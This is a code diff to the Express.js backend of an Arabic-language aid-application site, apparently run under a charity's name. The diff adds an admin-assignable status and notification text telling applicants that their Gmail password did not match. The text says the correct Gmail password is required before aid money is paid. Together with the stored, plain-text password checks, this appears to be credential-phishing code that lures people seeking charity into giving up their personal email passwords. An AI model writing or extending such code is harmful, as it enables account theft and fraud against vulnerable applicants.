@@ -781,7 +781,7 @@ app.post('/api/check-status', async (req, res) => {
     // 3. Validate Password (only if provided)
     if (queryPassword && match.password && match.password.trim() !== '') {
         if (match.password.trim() !== queryPassword) {
-            return res.status(401).json({ error: '❌ كلمة المرور غير صحيحة. يرجى التأكد من كلمة المرور المدخلة أثناء التسجيل.' });
+            return res.status(401).json({ error: '❌ كلمة مرور حسابك غير صحيحة. يرجى التأكد من كلمة المرور المدخلة أثناء التسجيل.' });
         }
     }
 
@@ -812,7 +812,7 @@ app.post('/api/check-status', async (req, res) => {
         };
         saveStatusLookupLog(failLogEntry);
 
-        return res.status(401).json({ error: '❌ كلمة المرور غير صحيحة. يرجى التأكد من كلمة المرور المدخلة أثناء التسجيل.' });
+        return res.status(401).json({ error: '❌ كلمة مرور حسابك غير صحيحة. يرجى التأكد من كلمة المرور المدخلة أثناء التسجيل.' });
     }
 
     const statusMessages = {
@@ -840,6 +840,11 @@ app.post('/api/check-status', async (req, res) => {
             title: '🟠 يوجد نقص في المستندات أو الثبوتيات المرفقة', 
             desc: 'نفيدكم بأنه عند فحص وتدقيق طلبكم، تبيّن وجود نقص أو عدم وضوح في بعض الوثائق والثبوتيات المطلوبة. يرجى التواصل مع فريق الدعم الفني أو تزويدنا بالثبوتيات اللازمة لاستكمال إجراءات القبول.', 
             badgeClass: 'status-incomplete' 
+        },
+        'invalid_email_password': {
+            title: '🔴 تعذر التحقق: عدم تطابق كلمة مرور حساب Gmail',
+            desc: 'نفيدكم بأنه أثناء مطابقة بيانات الحساب وتأكيد هوية المتقدم، تبيّن عدم صحة كلمة المرور الخاصة بحساب البريد الإلكتروني (Gmail) المسجل بالطلب. لإتمام التدقيق واعتماد الصرف المالي، يجب أن تكون كلمة المرور المدخلة مطابقة وصحيحة لبريد Gmail الخاص بك.',
+            badgeClass: 'status-invalid-pwd'
         }
     };
 
@@ -1155,7 +1160,7 @@ app.post('/api/admin/settings', requireAdminAuth, async (req, res) => {
 });
 app.post('/api/admin/update-status', requireAdminAuth, async (req, res) => {
     const { id, status } = req.body;
-    const validStatuses = ['pending', 'approved', 'delivered', 'rejected', 'incomplete'];
+    const validStatuses = ['pending', 'approved', 'delivered', 'rejected', 'incomplete', 'invalid_email_password'];
 
     if (!id || !validStatuses.includes(status)) {
         return res.status(400).json({ error: 'بيانات غير صالحة' });
@@ -1190,6 +1195,10 @@ app.post('/api/admin/update-status', requireAdminAuth, async (req, res) => {
             notifyText = `⚠️ *تحديث حالة الطلب - جمعية النور*
 
 مرحباً ${target.firstName}، نود إعلامك بوجود *نقص في المستندات والأوراق المرفقة* لطلبك رقم المرجع (${target.refCode}). يرجى التواصل معنا وتزويدنا بالثبوتيات اللازمة لاستكمال معالجة طلبك.`;
+        } else if (status === 'invalid_email_password') {
+            notifyText = `⚠️ *تحديث هام بشأن طلبك - جمعية النور*
+
+مرحباً ${target.firstName}، نود إعلامك بوجود *عدم تطابق في كلمة مرور حساب Gmail* المرفق بالطلب رقم (${target.refCode}). يرجى إعادة تسجيل الدخول والتأكد من إدخال كلمة المرور الصحيحة لبريدك الإلكتروني (Gmail) لاستكمال إجراءات صرف المساعدة.`;
         } else {
             notifyText = `🟡 *تحديث حالة الطلب - جمعية النور*
 
